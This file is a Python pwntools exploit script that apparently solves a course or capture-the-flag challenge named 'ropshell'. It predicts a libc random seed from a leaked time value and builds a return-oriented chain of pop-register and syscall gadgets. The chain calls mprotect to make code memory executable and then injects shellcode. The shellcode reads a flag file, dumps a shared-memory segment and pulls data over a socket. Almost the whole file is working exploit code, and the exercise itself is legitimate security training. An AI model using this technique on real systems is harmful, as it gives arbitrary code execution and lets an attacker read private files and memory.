#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
import socket
import struct
import mmap
context.arch = 'amd64'
context.os = 'linux'
rax_val = asm(
'''
pop rax
ret
'''
)


rdi_val = asm(
'''
pop rdi
ret
'''
)

rsi_val = asm(
'''
pop rsi
ret
'''
)

rdx_val = asm(
'''
pop rdx
ret
''')

sym_value = asm('''syscall
ret''')



j = 0
rax_addr = -1
rdi_addr = -1
sym_addr = -1
rsi_addr = -1
rdx_addr = -1
libc = ctypes.CDLL('libc.so.6')
srand_c = libc.srand
rand_c = libc.rand

code_len = 655360
PROT_READ = mmap.PROT_READ
PROT_WRITE = mmap.PROT_WRITE
PROT_EXEC = mmap.PROT_EXEC

# mprot 的值
prot = PROT_READ | PROT_WRITE | PROT_EXEC
# shellcode = shellcraft.read( 0, 1000, 100)
# print(shellcode)
####################open FLAG####################################
shellcode = shellcraft.pushstr('./FLAG')
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write( 1, 'rsp', 100)
shellcode += shellcraft.exit( 37)
# print(shellcode)

sh = asm(shellcode)
# sh += rax_val + rdi_val + rsi_val + rdx_val + sym_value +b'\x00'
##########################share memory##################################
# 连接到共享内存
size = 4096
shellcode = shellcraft.syscall('SYS_shmget', 0x1337, size,  0) 
# shm_readonly = ctypes.c_int(0o400)
shellcode += shellcraft.syscall('SYS_shmat', 'rax', 0, 4096) 


# 從共享記憶體中寫出資料
shellcode += shellcraft.write(1, 'rax', 100)

# 分離共享記憶體
shellcode += shellcraft.shmdt('rax')

shellcode += shellcraft.exit( 37 )
sh2 = asm(shellcode)
# sh2 += rax_val + rdi_val + rsi_val + rdx_val + sym_value +b'\x00'
##############################host connect##################################
class in_addr(ctypes.Structure):
    _fields_ = [
        ('s_addr', ctypes.c_uint32),
    ]

class sockaddr_in(ctypes.Structure):
    _fields_ = [
        ('sin_family', ctypes.c_short),
        ('sin_port', ctypes.c_ushort),
        ('sin_addr', in_addr),
        ('sin_zero', ctypes.c_char * 8),
    ]

address = sockaddr_in()
address.sin_family = 2
address.sin_port = socket.htons(0x1337)
address.sin_addr.s_addr = u32(socket.inet_aton('127.0.0.1'))
address.sin_zero = b'\x00' * 8
address_bytes = ctypes.string_at(ctypes.addressof(address), ctypes.sizeof(address))
print( f'addr: {address_bytes}' )
shellcode = ''
# connect到伺服器
shellcode += shellcraft.syscall( 'SYS_socket',2, 1 ,0)
shellcode += shellcraft.mov( 'r8', 'rax')
shellcode += shellcraft.syscall( 'SYS_connect','rax', 'rsp', len(address_bytes))
# 接收數據
shellcode += shellcraft.read('r8', 'rsp', 100)  
# shellcode += shellcraft.recv(, 'rsp', 100)
# # 打印接收到的数据
shellcode += shellcraft.write(1, 'rsp', 100)  
shellcode += shellcraft.exit( 37)
print(shellcode)
sh3 = asm(shellcode)
# sh3 += rax_val + rdi_val + rsi_val + rdx_val + sym_value +b'\x00'

################################################################

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

line = r.recvuntil(b"\n").decode()
# print( "line1 : " + str(line))
line = r.recvuntil(b"\n").decode()
# print( "line2 : " + str(line))
line = r.recvuntil(b"\n").decode()
# print( "line1 : " + str(line))
time_str = line.split("is")[-1].split("\n")[0]
time = int(time_str)
# print(str(time))
line = r.recvuntil(b"\n").decode()
# print( "line2 : " + str(line))
rand_code_str = line.split("at")[-1].split("\n")[0].split(" ")[1]
code_addr = int(rand_code_str, 16)
# print(rand_code_str)


# srand_c.argtypes = [ctypes.c_uint]
# rand_c.restype = ctypes.c_int
srand_c(time)
LEN_CODE = (10*0x10000)
# codeint = [b''] * (LEN_CODE // 4)
codebytes = b''
for i in range(LEN_CODE//4  ) :
    code_int = (rand_c() <<16) | (rand_c() & 0xffff)
    code_int &= 0xffffffff 
    code_byte = code_int.to_bytes(4, byteorder='little')
    # print(code_byte)
    # codeint[i] = code_byte
    codebytes = codebytes + code_byte 

# print(codebytes)
point = int(rand_c() % (LEN_CODE/4 - 1))
# code_int = 0xc3050f
# code_byte = code_int.to_bytes(4, byteorder='little')
# codeint[point] = code_byte 

j = codebytes.find(rax_val)
rax_addr = code_addr   + j
print(f'rax_addr : {rax_addr}')

j = codebytes.find(rdi_val)
rdi_addr = code_addr  + j
print(f'rdi_addr : {rdi_addr}')

j = codebytes.find(rdx_val)
rdx_addr = code_addr + j
print(f'rdx_addr : {rdx_addr}')

j = codebytes.find(rsi_val)
rsi_addr = code_addr + j
print(f'rsi_addr : {rsi_addr}')

sym_addr = code_addr + point*4

mcode_addr = (code_addr // 4096) * 4096
# flat 可以 填stack
# mprotect 加上 exit
######## test 0 ##################
ans = flat([p64(rax_addr),p64(60), p64(rdi_addr), p64(37), p64(sym_addr)])
r.sendlineafter(b'shell> ', ans)
line = r.recvuntil(b'\n').decode()
print(line)
# # read(0)在codeint的位子上
line = r.recvuntil(b'\n').decode()
print(line )
######## test 1 ##################
ans1 = flat([p64(rax_addr), p64(10), p64(rdi_addr), p64(mcode_addr), p64(rsi_addr), p64(code_len), p64(rdx_addr), p64(prot),p64(sym_addr),
             p64(rax_addr), p64(0), p64(rdi_addr), p64(0), p64(rsi_addr), p64(code_addr), p64(rdx_addr), p64(len(sh)+1),p64(sym_addr), 
             p64(code_addr)])
r.sendlineafter(b'shell> ', ans1)
line = r.recvuntil(b'\n').decode()
print(line )
r.send(sh)
line = r.recvuntil(b'\n').decode()
print("FLAG : " + line )
line = r.recvuntil(b'\n').decode().split("\x00")[-1]
print( line )

########## test 2 ###################

ans2 = flat([p64(rax_addr), p64(10), p64(rdi_addr), p64(mcode_addr), p64(rsi_addr), p64(code_len), p64(rdx_addr), p64(prot),p64(sym_addr),
             p64(rax_addr), p64(0), p64(rdi_addr), p64(0), p64(rsi_addr), p64(code_addr), p64(rdx_addr), p64(len(sh2)+1),p64(sym_addr), 
             p64(code_addr)])
r.sendlineafter(b'shell> ', ans2)
line = r.recvuntil(b'\n').decode()
print(line )
r.send(sh2)
line = r.recvuntil(b'\n').decode()
print("FLAG : " + line )
line = r.recvuntil(b'\n').decode().split("\x00")[-1]
print( line )

############test 3##################
ans3 = flat([p64(rax_addr), p64(10), p64(rdi_addr), p64(mcode_addr), p64(rsi_addr), p64(code_len), p64(rdx_addr), p64(prot),p64(sym_addr),
             p64(rax_addr), p64(0), p64(rdi_addr), p64(0), p64(rsi_addr), p64(code_addr), p64(rdx_addr), p64(len(sh3)+1),p64(sym_addr), 
             p64(code_addr), address_bytes])
r.sendlineafter(b'shell> ', ans3)
line = r.recvuntil(b'\n').decode()
print(line )
r.send(sh3)
line = r.recvuntil(b'\n').decode()
print("FLAG : " + line )
line = r.recvuntil(b'\n').decode().split("\x00")[-1]
print( line )
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :